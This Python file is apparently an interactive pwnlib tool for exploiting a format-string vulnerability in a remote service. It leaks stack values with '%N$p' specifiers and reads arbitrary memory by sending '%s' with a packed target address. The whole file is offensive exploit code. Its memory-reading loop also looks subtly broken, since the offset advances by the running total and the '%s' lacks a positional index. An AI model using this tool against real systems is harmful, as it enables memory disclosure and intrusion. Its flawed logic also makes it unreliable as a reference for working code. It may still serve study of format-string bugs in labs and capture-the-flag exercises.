import shell

saved_input = __builtins__.input
import pwnlib
print("hi", input, saved_input)

from shell import Command

class NoConnectionException(Exception):
    pass

class PrintfShell(shell.Shell):
    def __init__(self, read, write, marker=b"$ ", conn=None):
        shell.Shell.__init__(self)
        self.read = read
        self.write = write
        self.conn = conn
        self.marker = marker

    @Command
    def connect(self, address, port):
        port = int(port)
        self.conn = pwnlib.remote(address, port)
        self.conn.recvuntil(self.marker)
        print(self.conn)
    
    def read_response(self, string):
        string = self.write(string)
        self.conn.send(string)
        resp = self.conn.recvuntil(self.marker)
        if self.conn.can_recv():
            print(resp)
            print("unexpectedly more:")
            resp += self.conn.recv()
            print(resp)
        return self.read(resp[:-len(self.marker)])
    
    @Command
    def show_stack(self, n : int):
        n = int(n)
        if not self.conn:
            raise NoConnectionException("You need to connect first")
        stack = []
        for i in range(1, n+1):
            value = self.read_response(bytes(f"%{i}$p", 'ascii'))
            stack.append(value)
        print(stack)
        for value in stack:
            if value == b"(nil)":
                value = b"0x0"
            _, value = value.strip().split(b"0x")
            bs = int(value, 16).to_bytes(8, byteorder="little")
            print(f"{str(value, 'ascii'):<16} {repr(bs)}")
        return stack
    
    @Command
    def read_bytes(self, addr : int, n : int):
        n = int(n)
        addr = int(addr,16)
        buffer = b"XXXXXX"
        all_bytes = b""
        offset = 0
        while len(all_bytes) < n:
            res = self.read_response(b"%s" + buffer + pwnlib.util.packing.p64(addr + offset))
            print("Res before buffer", res)
            res = res[:-len(buffer)]
            print("res after buffer:", res)
            res = res + b"\x00"
            all_bytes += res
            offset += len(all_bytes)
        print(all_bytes)
        return all_bytes

shell = PrintfShell(read=lambda x: x[:-1], write=lambda x:x+b"\n")
shell.runloop()